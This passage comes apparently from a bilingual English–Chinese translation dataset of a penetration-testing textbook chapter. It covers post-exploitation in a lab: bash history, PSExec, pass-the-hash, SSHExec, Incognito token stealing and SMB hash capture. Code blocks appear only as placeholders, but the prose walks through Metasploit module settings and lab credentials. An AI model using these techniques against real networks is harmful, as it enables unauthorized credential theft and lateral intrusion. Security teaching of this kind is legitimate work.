    XP目标机器上的69号端口/UDP，传统上用于TFTP，在我们的UDP Nmap扫描中返回了`open|filtered`。因为我们的扫描没有收到任何响应，因此不清楚是否有任何程序在该端口上监听。除非进行TFTP服务器的模糊测试并可能使其崩溃，否则很难确定是否有TFTP软件在运行，或者究竟是哪个TFTP软件在运行。现在我们已经获得了系统的访问权限，可以进一步调查正在运行的软件，看是否有我们遗漏的漏洞。
- en: Note
  id: totrans-182
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: Earlier in the chapter we used the Meterpreter `ps` command to view all running
    processes on the Windows XP target. One of these is 3CTftpSvc.exe, an older version
    of the 3Com TFTP service that is subject to a buffer overflow condition in the
    TFTP long transport mode. (We’ll write an exploit for this issue by hand in [Chapter 19](ch19.xhtml
    "Chapter 19. Fuzzing, Porting Exploits, and Metasploit Modules"), but there’s
    a Metasploit module for this issue as well.) Though it would be difficult for
    an attacker to identify this issue remotely, the software is still vulnerable,
    and we should include it in our pentest report.
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章早些时候，我们使用Meterpreter的`ps`命令查看了Windows XP目标机器上所有正在运行的进程。其中一个进程是3CTftpSvc.exe，这是3Com
    TFTP服务的旧版本，容易受到TFTP长传输模式中的缓冲区溢出漏洞的影响。（我们将在[第19章](ch19.xhtml "第19章 模糊测试、移植漏洞和Metasploit模块")手动编写一个针对这个问题的利用代码，但这个问题也有对应的Metasploit模块。）虽然攻击者远程识别这个问题会比较困难，但软件仍然存在漏洞，我们应该将其纳入我们的渗透测试报告中。
- en: It may be that you won’t discover a network-facing vulnerability until after
    you have gained access to the system. Without sending random TFTP input to the
    server and analyzing the results, it would be difficult for us to find this issue.
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 可能是直到你获得系统访问权限后，才会发现面向网络的漏洞。如果不向服务器发送随机的TFTP输入并分析结果，我们很难找到这个问题。
- en: Checking Bash History
  id: totrans-185
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 检查Bash历史记录
- en: One place to look for potentially interesting information on a Linux system
    is in a user’s Bash history. When a Bash shell is closed, the commands that have
    been executed are written to a file called *.bash_history* in the user’s home
    directory. A perhaps rather contrived example where the user’s password is saved
    in plaintext in the Bash history file is shown here.
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 在Linux系统中，寻找潜在有趣的信息的一个地方是用户的Bash历史记录。当Bash Shell关闭时，执行过的命令会写入一个名为*.bash_history*的文件，该文件位于用户的主目录中。这里展示了一个或许有些牵强的例子，其中用户的密码以明文形式保存在Bash历史文件中。
- en: '[PRE39]'
  id: totrans-187
  prefs: []
  type: TYPE_PRE
  zh: '[PRE39]'
- en: Lateral Movement
  id: totrans-188
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 横向移动
- en: Once we have access to one system in a networked environment, can we use it
    to access additional systems and their sensitive data? If our exploited system
    is a member of a domain, we can certainly try to compromise a domain account or
    ideally get domain administrator access so that we can log in to and manage all
    systems in the domain.
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们访问了网络环境中的一个系统，我们是否可以利用它访问更多的系统及其敏感数据？如果我们被利用的系统属于一个域，我们当然可以尝试破解域账户，或者最好获取域管理员权限，这样我们就能登录并管理域中的所有系统。
- en: But even if you can’t get control of a domain, you may still be able to access
    the systems in that domain if they were all installed from the same system install
    image with the same local administrator password that has never been changed.
    If we can crack this password for one machine, we may be able to log in to many
    machines in the environment without domain access. Also, if a user has an account
    on multiple systems, he or she may use the same password on each system, which
    might allow us to log in with credentials we found elsewhere in the environment.
    (Good password policies help prevent these kinds of vulnerabilities, but passwords
    are often the weakest link, even in high-security environments.)
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 即使你无法控制域，你仍然可能能够访问该域中的系统，如果这些系统都是通过相同的系统安装镜像安装的，且使用的本地管理员密码从未更改过。如果我们能破解一台机器的密码，我们也许能在没有域访问权限的情况下登录到环境中的许多机器。此外，如果一个用户在多个系统上都有帐户，他或她可能会在每个系统上使用相同的密码，这可能允许我们使用在其他地方找到的凭据登录。（良好的密码策略有助于防止这些漏洞，但即便在高安全性环境中，密码往往是最薄弱的环节。）
- en: Let’s look at a few techniques for turning access to one system into access
    to many.
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看一下几种将对一个系统的访问转化为对多个系统访问的技巧。
- en: PSExec
  id: totrans-192
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: PSExec
- en: The PSExec technique originated in the Sysinternals Windows management tool
    set in the late 1990s. The utility worked by using valid credentials to connect
    to the ADMIN$ share on the Windows XP SMB server. PSExec uploads a Windows service
    executable to the ADMIN$ share and then connects to the Windows Service Control
    Manager using remote procedure call (RPC) to start the executable service. The
    service then sets up an SMB named `pipe` to send commands and remotely control
    the target system.
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: PSExec技术起源于1990年代末的Sysinternals Windows管理工具集。该工具通过使用有效的凭据连接到Windows XP SMB服务器上的ADMIN$共享来工作。PSExec将一个Windows服务可执行文件上传到ADMIN$共享，然后通过远程过程调用（RPC）连接到Windows服务控制管理器，启动可执行服务。该服务随后设置一个名为`pipe`的SMB管道，用于发送命令并远程控制目标系统。
- en: The Metasploit module *exploit/windows/smb/psexec* implements a very similar
    technique. The module requires a running SMB server on the target and credentials
    that give access to the ADMIN$ share.
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit模块*exploit/windows/smb/psexec*实现了一个非常类似的技术。该模块需要目标上运行的SMB服务器和可用于访问ADMIN$共享的凭据。
- en: In [Chapter 9](ch09.xhtml "Chapter 9. Password Attacks"), we cracked the password
    hashes for users on our Windows XP target. You can probably imagine using the
    found credentials and PSExec to gain access to additional systems. Use the credentials
    *georgia:password* with the PSExec module, as shown in [Example 13-21](ch13.xhtml#using_the_psexec_module
    "Example 13-21. Using the PSExec module").
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 在[第9章](ch09.xhtml "第9章。密码攻击")中，我们破解了Windows XP目标上用户的密码哈希值。你可能能想象使用找到的凭据和PSExec来访问更多系统。使用凭据*georgia:password*与PSExec模块，如[示例13-21](ch13.xhtml#using_the_psexec_module
    "示例13-21。使用PSExec模块")所示。
- en: Example 13-21. Using the PSExec module
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 示例13-21。使用PSExec模块
- en: '[PRE40]'
  id: totrans-197
  prefs: []
  type: TYPE_PRE
  zh: '[PRE40]'
- en: In addition to `RHOST`, we need to tell the module which SMBDomain, SMBUser,
    and SMBPass to use. Our Windows XP target is not a member of a domain, so we can
    leave the SMBDomain option at the default, `WORKGROUP`.
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 除了`RHOST`，我们还需要告诉模块使用哪个SMBDomain、SMBUser和SMBPass。我们的Windows XP目标不是域成员，因此我们可以将SMBDomain选项保持为默认值`WORKGROUP`。
- en: Set SMBUser to `georgia` ❶ and SMBPass to `password` ❷, our discovered credentials.
    Then run the exploit module. The module embeds the chosen payload (in this case,
    the default *windows/meterpreter/reverse_tcp*) into a Windows service image executable.
    After uploading the executable and contacting Windows Service Control Manager,
    the service copies the shellcode into executable memory for the service process
    and redirects execution to the payload. Thus our payload runs and connects back
    to our Metasploit listener on Kali. Even though we logged on as the user *georgia*,
    because our payload is running as a system service, our session automatically
    has system privileges.
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: 将SMBUser设置为`georgia` ❶，SMBPass设置为`password` ❷，这是我们发现的凭据。然后运行利用模块。该模块将选定的有效载荷（在本例中是默认的*windows/meterpreter/reverse_tcp*）嵌入到Windows服务可执行文件中。上传可执行文件并联系Windows服务控制管理器后，服务将Shellcode复制到服务进程的可执行内存中，并将执行重定向到有效载荷。这样，我们的有效载荷就会运行，并连接回我们在Kali上的Metasploit监听器。尽管我们以用户*georgia*身份登录，但由于我们的有效载荷作为系统服务运行，我们的会话会自动获得系统权限。
- en: Note
  id: totrans-200
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: This is why we made the change to the Windows XP Security Policy in [Chapter 1](ch01.xhtml
    "Chapter 1. Setting Up Your Virtual Lab"). If Windows XP were a member of a domain,
    we could fill in the SMBDomain option and use PSExec to get System access on any
    system where the domain user was a local administrator. This is a great way to
    move around a network looking for interesting information, additional password
    hashes, and more vulnerabilities.
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: 这就是我们在[第 1 章](ch01.xhtml "第 1 章 设置虚拟实验室")中修改 Windows XP 安全策略的原因。如果 Windows XP
    是域成员，我们可以填写 SMBDomain 选项，并使用 PSExec 在域用户是本地管理员的任何系统上获得系统访问权限。这是一个很好的方法，可以在网络中寻找有趣的信息、额外的密码哈希以及更多的漏洞。
- en: Pass the Hash
  id: totrans-202
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Pass the Hash
- en: Our previous attack relied on our ability to reverse the password hash and gain
    access to the plaintext password for a user account. Of course, in the case of
    our Windows XP target, this is trivial because it uses the entirely crackable
    LM hashing algorithm.
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 我们之前的攻击依赖于能够反向破解密码哈希并获取用户账户的明文密码。当然，在我们的 Windows XP 目标系统中，这非常简单，因为它使用的是完全可以破解的
    LM 哈希算法。
- en: In [Chapter 9](ch09.xhtml "Chapter 9. Password Attacks"), we learned that when
    we have only the NTLM user authentication hash of a password, instead of the weaker
    LM version, our ability to reverse the hash in a reasonable amount of time depends
    on the weakness of the password, the strength of our wordlist, and even the algorithms
    employed by the password-cracking program. If we can’t reverse the password hash,
    we’re going to have a tough time logging in to other systems with the plaintext
    credentials.
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 在[第 9 章](ch09.xhtml "第 9 章 密码攻击")中，我们了解到，当我们只有密码的 NTLM 用户身份验证哈希，而没有较弱的 LM 版本时，我们反向破解哈希的能力取决于密码的弱点、我们词表的强度，甚至取决于密码破解程序使用的算法。如果我们无法反向破解密码哈希，那我们将很难使用明文凭证登录其他系统。
- en: PSExec comes to the rescue again. When a user logs in over SMB, his or her password
    is not sent to the target in plaintext. Instead, the target system issues a challenge
    that can be answered only by someone with the correct password. In this case,
    the answer to the challenge is the LM- or NTLM-hashed password, depending on the
    implementation.
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: PSExec 再次派上了用场。当用户通过 SMB 登录时，他或她的密码不会以明文形式发送到目标系统。相反，目标系统会发出一个挑战，只有拥有正确密码的人才能回答。在这种情况下，挑战的答案是
    LM 或 NTLM 哈希密码，这取决于具体实现。
- en: When you log in to a remote system, your Windows application calls a utility
    to hash the password, and that hash is sent to the remote system for authentication.
    The remote system assumes that if you send the correct hash, you must have access
    to the correct plaintext password—that is, after all, one of the fundamentals
    of one-way hash functions. Can you think of a scenario where you might have access
    to password hashes but not the plaintext passwords?
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: 当你登录到远程系统时，你的 Windows 应用程序会调用一个工具来对密码进行哈希处理，然后将该哈希发送到远程系统进行身份验证。远程系统假设，如果你发送了正确的哈希，那么你一定可以访问到正确的明文密码——毕竟，这正是一种单向哈希函数的基本原理。你能想到一个场景，在这种情况下你可能只能访问密码哈希，而无法获取明文密码吗？
- en: In [Chapter 9](ch09.xhtml "Chapter 9. Password Attacks"), we were able to reverse
    all password hashes on our target systems. Additionally, on our Windows XP target,
    we were able to reverse the LM hashes regardless of the strength of the password.
    But let’s simulate a situation where we have only password hashes, as shown with
    the Meterpreter `hashdump` command in [Example 13-22](ch13.xhtml#using_hashdump
    "Example 13-22. Using hashdump").
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 在[第 9 章](ch09.xhtml "第 9 章 密码攻击")中，我们成功地反向破解了目标系统上的所有密码哈希。此外，在我们的 Windows XP
    目标上，不管密码的强度如何，我们都能够反向破解 LM 哈希。但是，让我们模拟一个只有密码哈希的情况，如[示例 13-22](ch13.xhtml#using_hashdump
    "示例 13-22 使用 hashdump")中通过 Meterpreter `hashdump` 命令展示的那样。
- en: Example 13-22. Using `hashdump`
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-22. 使用 `hashdump`
- en: '[PRE41]'
  id: totrans-209
  prefs: []
  type: TYPE_PRE
  zh: '[PRE41]'
- en: Note
  id: totrans-210
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: 'When using the `hashdump` Meterpreter command against newer Windows operating
    systems, you may find that it fails. An alternative is the post module: *post/windows/gather/hashdump*.
    There is even post/windows/gather/smart_hashdump, which can not only gather local
    hashes but also active directory hashes if you have exploited a domain controller.
    So if at first you don’t succeed in dumping password hashes on a pentest, explore
    additional options.'
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: 当你在较新的 Windows 操作系统上使用 `hashdump` Meterpreter 命令时，可能会发现它无法成功。一个替代方案是使用 post
    模块：*post/windows/gather/hashdump*。还有一个 post/windows/gather/smart_hashdump，它不仅可以收集本地哈希，还可以收集活动目录哈希，前提是你已经利用了域控制器。因此，如果你在渗透测试中第一次未能成功提取密码哈希，不妨尝试其他选项。
- en: Let’s use the Metasploit PSExec module to take advantage of how SMB authenticates
    and a technique called *Pass the Hash*. Instead of setting the SMBPass option
    to *georgia*’s password, copy in the LM and NTLM hashes for *georgia* from the
    `hashdump` in [Example 13-23](ch13.xhtml#psexec_pass_the_hash "Example 13-23. PSExec
    Pass the Hash") as the SMBPass option.
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们使用 Metasploit 的 PSExec 模块，利用 SMB 认证的方式和一种叫做 *Pass the Hash* 的技术。我们不需要将 SMBPass
    选项设置为 *georgia* 的密码，而是将 *georgia* 的 LM 和 NTLM 哈希从 [示例 13-23](ch13.xhtml#psexec_pass_the_hash
    "示例 13-23. PSExec Pass the Hash") 中的 `hashdump` 复制到 SMBPass 选项中。
- en: Example 13-23. PSExec Pass the Hash
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-23. PSExec Pass the Hash
- en: '[PRE42]'
  id: totrans-214
  prefs: []
  type: TYPE_PRE
  zh: '[PRE42]'
- en: Again we’re able to use PSExec to get a Meterpreter session. Even without knowing
    the plaintext password, the password hash alone can be enough to get access to
    other systems in the environment using PSExec.
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: 我们再次能够使用 PSExec 获取 Meterpreter 会话。即使不知道明文密码，仅凭密码哈希也足以通过 PSExec 获得访问其他系统的权限。
- en: SSHExec
  id: totrans-216
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: SSHExec
- en: Like PSExec for Windows, we can use SSHExec to move through an environment’s
    Linux systems if we have even one set of valid credentials, which are likely to
    work elsewhere in the environment. The Metasploit module *multi/ssh/sshexec* and
    its options are shown in [Example 13-24](ch13.xhtml#using_sshexec "Example 13-24. Using
    SSHExec").
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: 就像 Windows 的 PSExec 一样，如果我们拥有一组有效的凭据，SSHExec 可以帮助我们在环境的 Linux 系统中移动，这些凭据可能在环境的其他地方也能使用。[示例
    13-24](ch13.xhtml#using_sshexec "示例 13-24. 使用 SSHExec") 中展示了 Metasploit 模块 *multi/ssh/sshexec*
    及其选项。
- en: Example 13-24. Using SSHExec
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-24. 使用 SSHExec
- en: '[PRE43]'
  id: totrans-219
  prefs: []
  type: TYPE_PRE
  zh: '[PRE43]'
- en: In this example, we know the credentials *georgia:password* from having cracked
    them in [Chapter 9](ch09.xhtml "Chapter 9. Password Attacks"). Although in this
    case we will just be logging into the same host again (similar to what we did
    in [PSExec](ch13.xhtml#psexec "PSExec")), we could use this same technique on
    other hosts in that same environment that have an account for *georgia*.
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个例子中，我们知道凭据 *georgia:password*，因为我们在 [第 9 章](ch09.xhtml "第 9 章. 密码攻击") 中破解过它们。虽然在这种情况下我们只是再次登录同一主机（类似于我们在
    [PSExec](ch13.xhtml#psexec "PSExec") 中所做的），但我们也可以将这一技术应用于该环境中其他有 *georgia* 账户的主机。
- en: As with PSExec, we need valid credentials in order to authenticate. We set the
    `USERNAME` to *georgia* ❶ and `PASSWORD` to *password* ❷, and then choose *linux/x86/meterpreter/reverse_*tcp
    as the payload.
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: 与 PSExec 一样，我们需要有效的凭据才能进行身份验证。我们将 `USERNAME` 设置为 *georgia* ❶，`PASSWORD` 设置为
    *password* ❷，然后选择 *linux/x86/meterpreter/reverse_*tcp 作为有效载荷。
- en: Unlike with PSExec (which uploaded a binary and ran it as a System service,
    automatically giving us System privileges), with SSHExec we are still user *georgia*.
    You can see how this exploit could prove to be a quick way to move around an environment
    in search of additional information and vulnerabilities on other Linux systems.
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: 与 PSExec（它上传一个二进制文件并将其作为系统服务运行，从而自动赋予我们系统权限）不同，使用 SSHExec 时我们仍然是用户*georgia*。你可以看到这个漏洞利用如何成为在环境中快速移动，寻找其他
    Linux 系统的附加信息和漏洞的有效方式。
- en: Token Impersonation
  id: totrans-223
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 令牌冒充
- en: Now that we know we might not even need plaintext passwords to gain access to
    other systems, is there any case where we may not even need the password hashes?
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们知道，甚至可能不需要明文密码就能访问其他系统，那有没有可能我们根本不需要密码哈希呢？
- en: One interesting Windows security construct is the concept of *tokens*. Tokens
    are primarily used for access control. Based on the token of a process, the operating
    system can make decisions about which resources and operations should be made
    available to it.
  id: totrans-225
  prefs: []
  type: TYPE_NORMAL
  zh: 一个有趣的 Windows 安全构造是 *令牌* 的概念。令牌主要用于访问控制。根据进程的令牌，操作系统可以决定哪些资源和操作应该对其开放。
- en: Think of a token as a kind of temporary key that gives you access to certain
    resources without having to enter your password every time you want to perform
    a privileged operation. When a user logs in to the system interactively, such
    as directly through the console or from a remote desktop, a *delegation token*
    is created.
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: 可以将令牌看作是一种临时的密钥，允许你在不需要每次输入密码的情况下访问某些资源，尤其是执行特权操作时。当用户通过控制台或远程桌面等交互方式登录系统时，会创建一个
    *委派令牌*。
- en: Delegation tokens allow the process to impersonate the token on the local system
    as well as on the network, for example on other systems in a domain. Delegation
    tokens contain credentials and can be used to authenticate with other systems
    that use these credentials, such as the domain controller. Tokens persist until
    reboot, and even if a user logs out, his or her token will still be present on
    the system until it shuts down. If we can steal another token on the system, we
    can potentially gain additional privileges and even access to additional systems.
  id: totrans-227
  prefs: []
  type: TYPE_NORMAL
  zh: 委派令牌允许进程在本地系统以及网络中冒充令牌，例如在域中的其他系统上。委派令牌包含凭据，可用于与其他使用这些凭据的系统进行身份验证，如域控制器。令牌会一直存在，直到重启，即使用户注销，令牌仍然会保留在系统中，直到系统关闭。如果我们能够窃取系统中的另一个令牌，我们可能会获得额外的权限，甚至访问更多系统。
- en: Incognito
  id: totrans-228
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Incognito
- en: 'We’re on a compromised system: our Windows XP target. Which tokens are on the
    system, and how do we steal them? *Incognito* was originally a standalone tool
    developed by security researchers conducting research into using token stealing
    for privilege escalation, but it has since been added as an extension to Meterpreter.
    Incognito will help us enumerate and steal all the tokens on a system.'
  id: totrans-229
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在一个被攻破的系统上：我们的 Windows XP 目标。系统上有哪些令牌，我们如何窃取它们？*Incognito* 最初是一个由安全研究人员开发的独立工具，目的是研究如何利用令牌窃取进行权限提升，但它后来作为扩展被添加到了
    Meterpreter 中。Incognito 将帮助我们枚举并窃取系统上的所有令牌。
- en: Incognito is not loaded into Meterpreter by default, but we can add it with
    the `load` command, as shown here. Use one of your Meterpreter sessions currently
    running as system, or use privilege escalation to elevate your access. (*System*
    has access to all tokens on the target.)
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: Incognito 默认不会加载到 Meterpreter 中，但我们可以使用 `load` 命令将其添加，如下所示。使用当前作为系统运行的 Meterpreter
    会话，或使用特权提升来提高访问权限。（*System* 拥有目标系统上的所有令牌的访问权限。）
- en: '[PRE44]'
  id: totrans-231
  prefs: []
  type: TYPE_PRE
  zh: '[PRE44]'
- en: Before we use Incognito, switch users on your Windows XP target and log in as
    *secret* with the password *Password123*. This login will create a delegation
    token on the target for us to impersonate. As we list tokens, Incognito searches
    all handles on the system to determine which ones belong to tokens using low-level
    Windows API calls. To see all the user tokens available with the Meterpreter Incognito,
    enter the command **`list_tokens -u`** as shown in [Example 13-25](ch13.xhtml#enumerating_tokens_with_incognito
    "Example 13-25. Enumerating tokens with Incognito").
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: 在使用 Incognito 之前，请在 Windows XP 目标上切换用户并以 *secret* 用户身份登录，密码为 *Password123*。此登录操作将在目标上创建一个委派令牌供我们冒充。当我们列出令牌时，Incognito
    会搜索系统上的所有句柄，以确定哪些属于令牌，使用的是低级的 Windows API 调用。要查看所有 Meterpreter Incognito 可用的用户令牌，请输入命令
    **`list_tokens -u`**，如 [示例 13-25](ch13.xhtml#enumerating_tokens_with_incognito
    "示例 13-25. 使用 Incognito 枚举令牌") 所示。
- en: Example 13-25. Enumerating tokens with Incognito
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-25. 使用 Incognito 枚举令牌
- en: '[PRE45]'
  id: totrans-234
  prefs: []
  type: TYPE_PRE
  zh: '[PRE45]'
- en: We see tokens for both *georgia* and *secret*. Let’s try stealing *secret*’s
    delegation token, effectively gaining the privileges of this user. Use the `impersonate_token`
    command to steal the token, as shown in [Example 13-26](ch13.xhtml#stealing_a_token_with_incognito
    "Example 13-26. Stealing a token with Incognito"). (Note that we use two backslashes
    to escape the backslash between the domain—in this case, the local machine name—and
    the username.)
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: 我们看到了 *georgia* 和 *secret* 的令牌。让我们尝试窃取 *secret* 的委派令牌，实质上获得该用户的权限。使用 `impersonate_token`
    命令来窃取令牌，如 [示例 13-26](ch13.xhtml#stealing_a_token_with_incognito "示例 13-26. 使用
    Incognito 窃取令牌") 所示。（请注意，我们使用两个反斜杠来转义反斜杠，这个反斜杠位于域名——在此情况下是本地机器名——和用户名之间。）
- en: Example 13-26. Stealing a token with Incognito
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-26. 使用 Incognito 窃取令牌
- en: '[PRE46]'
  id: totrans-237
  prefs: []
  type: TYPE_PRE
  zh: '[PRE46]'
- en: 'Having stolen *secret*’s token, if we run `getuid` we should see that we are
    effectively now the user *secret*. This can be especially interesting when in
    a domain: If *secret* is a domain administrator, we are now a domain administrator
    as well, and we can do things like create a new domain administrator account or
    change the domain administrator’s password. (We’ll look at how to add accounts
    from the command line in [Persistence](ch13.xhtml#persistence "Persistence").)'
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: 窃取了 *secret* 的令牌后，如果我们运行 `getuid`，我们应该能看到我们实际上现在是用户 *secret*。这在域中尤为有趣：如果 *secret*
    是域管理员，那么我们现在也成为了域管理员，我们可以做一些事情，比如创建新的域管理员账户或更改域管理员的密码。（我们将在 [持久化](ch13.xhtml#persistence
    "持久化") 中查看如何通过命令行添加账户。）
- en: SMB Capture
  id: totrans-239
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: SMB 捕获
- en: Let’s look at one more interesting consequence of token stealing. In a domain,
    password hashes for domain users are stored only on the domain controller, which
    means that running a hashdump on an exploited system will give us password hashes
    only for local users. We don’t have a domain set up, so *secret*’s password hash
    is stored locally, but imagine that *secret* is instead a domain user. Let’s look
    at a way of capturing the password hashes without gaining access to the domain
    controller by passing the hash to an SMB server we control and recording the results.
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看一下令牌窃取的另一个有趣后果。在域中，域用户的密码哈希仅存储在域控制器上，这意味着在被利用的系统上运行 hashdump 只会给我们本地用户的密码哈希。我们没有设置域，因此
    *secret* 的密码哈希被存储在本地，但假设 *secret* 是域用户。让我们看看如何在不访问域控制器的情况下捕获密码哈希，通过将哈希传递给我们控制的
    SMB 服务器并记录结果。
- en: Open a second instance of Msfconsole, and use the module *auxiliary/server/capture/smb*
    to set up an SMB server and capture any authentication attempts. Like the client-side
    attack modules we studied in [Chapter 10](ch10.xhtml "Chapter 10. Client-Side
    Exploitation"), this module does not directly attack another system; it just sets
    up a server and waits. Set up the module options as shown in [Example 13-27](ch13.xhtml#using_the_smb_capture_module
    "Example 13-27. Using the SMB capture module").
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: 打开第二个 Msfconsole 实例，使用模块 *auxiliary/server/capture/smb* 来设置一个 SMB 服务器并捕获任何身份验证尝试。与我们在[第
    10 章](ch10.xhtml "第 10 章. 客户端攻击")中学习的客户端攻击模块类似，这个模块并不会直接攻击其他系统；它只是设置一个服务器并等待。按照[示例
    13-27](ch13.xhtml#using_the_smb_capture_module "示例 13-27. 使用 SMB 捕获模块")中所示设置模块选项。
- en: Example 13-27. Using the SMB capture module
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-27. 使用 SMB 捕获模块
- en: '[PRE47]'
  id: totrans-243
  prefs: []
  type: TYPE_PRE
  zh: '[PRE47]'
- en: You can save the results to a *CAINPWFILE* or a *JOHNPWFILE*, which will save
    the captured hashes in the formats expected by the Cain and Abel password tool
    for Windows and John the Ripper, respectively. Let’s set it to *JOHNPWFILE* ❶
    because we learned how to use John in [Chapter 9](ch09.xhtml "Chapter 9. Password
    Attacks").
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以将结果保存到 *CAINPWFILE* 或 *JOHNPWFILE*，这将以 Cain and Abel 密码工具和 John the Ripper
    预期的格式分别保存捕获的哈希值。我们将其设置为 *JOHNPWFILE* ❶，因为我们在[第 9 章](ch09.xhtml "第 9 章. 密码攻击")中学习了如何使用
    John。
- en: Now return to your Meterpreter session where you impersonated *secret*’s token
    in the previous section, and drop to a shell, as shown next. Because we’ve stolen
    *secret*’s token, this shell should be running as *secret*. Knowing that delegation
    tokens include credentials to authenticate with other systems, we’ll use the `net
    use` Windows command to attempt to authenticate with our fake SMB capture server.
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
  zh: 现在返回到你之前在 Meterpreter 会话中冒充 *secret* 的令牌，并进入 shell，如下所示。由于我们已经窃取了 *secret* 的令牌，因此这个
    shell 应该以 *secret* 的身份运行。知道委派令牌包含用于与其他系统认证的凭证后，我们将使用 `net use` Windows 命令尝试与我们伪造的
    SMB 捕获服务器进行身份验证。
- en: Connect to any share you like on the Kali SMB server. The login will fail, but
    the damage will be done.
  id: totrans-246
  prefs: []
  type: TYPE_NORMAL
  zh: 连接到 Kali SMB 服务器上的任何共享。登录会失败，但攻击已经发生。
- en: '[PRE48]'
  id: totrans-247
  prefs: []
  type: TYPE_PRE
  zh: '[PRE48]'
- en: Returning to your SMB Capture Msfconsole window, you should see that you’ve
    captured a set of password hashes.
  id: totrans-248
  prefs: []
  type: TYPE_NORMAL
  zh: 返回到你的 SMB 捕获 Msfconsole 窗口，你应该看到你已经捕获到了一组密码哈希值。
- en: '[PRE49]'
  id: totrans-249
  prefs: []
  type: TYPE_PRE
  zh: '[PRE49]'
- en: Note
  id: totrans-250
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注释
- en: 'This exercise can be a bit flaky, particularly without a Windows domain present.
    You might have trouble capturing the hash and instead get something like this:'
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: 这个练习可能会有点不稳定，尤其是在没有 Windows 域的情况下。你可能会遇到捕获哈希失败的情况，反而得到类似这样的内容：
- en: '[PRE50]'
  id: totrans-252
  prefs: []
  type: TYPE_PRE
  zh: '[PRE50]'
- en: '*This is a common issue. Just try to understand the concepts so you can try
    them in client environments where Windows domains are deployed.*'
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
  zh: '*这是一个常见问题。只需尝试理解这些概念，这样你就可以在部署了 Windows 域的客户端环境中进行尝试。*'
- en: The results are saved in the proper format in the JOHNPWFILE Metasploit module
    option for *auxiliary/server/capture/smb*. For example, since we set our JOHNPWFILE
    as /*root/johnfile*, the file to feed into John is */root/johnfile_netntlm*. When
    you compare the hashes to those dumped with `hashdump` in [Example 13-22](ch13.xhtml#using_hashdump
    "Example 13-22. Using hashdump"), you’ll see that the hashes for *secret* differ.
    What’s going on? As it turns out, these hashes are for NETLM and NETNTLM, which
    are a bit different than the regular LM and NTLM Windows hashes we worked with
    in [Chapter 9](ch09.xhtml "Chapter 9. Password Attacks"). And when you look at
    the *JOHNPWFILE*, you’ll see that its format is a bit different from what we’ve
    seen previously with John the Ripper.
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: 结果被以正确的格式保存在*auxiliary/server/capture/smb*的JOHNPWFILE Metasploit模块选项中。例如，由于我们将JOHNPWFILE设置为/*root/johnfile*，所以要输入给John的文件是*/root/johnfile_netntlm*。当你将哈希与[示例13-22](ch13.xhtml#using_hashdump
    "示例13-22. 使用hashdump")中`hashdump`导出的哈希进行对比时，你会发现*secret*的哈希值不同。到底发生了什么？事实证明，这些哈希值是用于NETLM和NETNTLM的，它们与我们在[第9章](ch09.xhtml
